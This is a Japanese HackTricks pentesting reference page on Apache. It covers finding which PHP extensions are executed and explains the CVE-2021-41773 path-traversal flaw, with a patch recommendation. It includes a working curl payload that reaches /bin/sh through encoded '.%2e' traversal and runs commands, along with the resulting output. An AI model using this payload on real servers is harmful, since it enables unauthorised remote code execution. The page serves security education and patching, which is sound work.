<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>


# 実行可能なPHP拡張機能

Apacheサーバーが実行している拡張機能を確認します。それらを検索するには、次のコマンドを実行します：
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
また、この設定を見つけることができる場所の一部は以下の通りです:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
# CVE-2021-41773

Apache 2.4.49 には、パスの正規化に関連する脆弱性が存在します。この脆弱性を悪用すると、攻撃者は `files` ディレクトリの外にあるファイルやディレクトリにアクセスすることができます。これにより、機密情報が漏洩する可能性があります。

## 概要

Apache HTTP Server 2.4.49 では、特定の設定で `mod_cgi` を使用している場合、リモートの攻撃者が URL パスを操作して、スクリプト外のファイルにアクセスすることができます。これにより、任意のファイル読み取りや、場合によってはコード実行が可能になります。

## 影響を受けるバージョン

- Apache HTTP Server 2.4.49

## 詳細

攻撃者は、正規化されるべきパスに `..%2f`（URL エンコードされた `../`）を挿入することで、Apache のディレクトリトラバーサル防御をバイパスすることができます。これにより、Web サーバーのルートディレクトリ外のファイルにアクセスすることが可能になります。

## 悪用方法

1. 攻撃者は、脆弱な Apache サーバーに対して、特定のパターンを含むリクエストを送信します。
2. リクエストは、Apache によって正しく正規化されず、攻撃者が意図したファイルにアクセスすることを可能にします。

## 対策

Apache は CVE-2021-41773 に対するパッチをリリースしています。影響を受けるバージョンを使用している場合は、最新バージョンにアップデートすることが推奨されます。
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
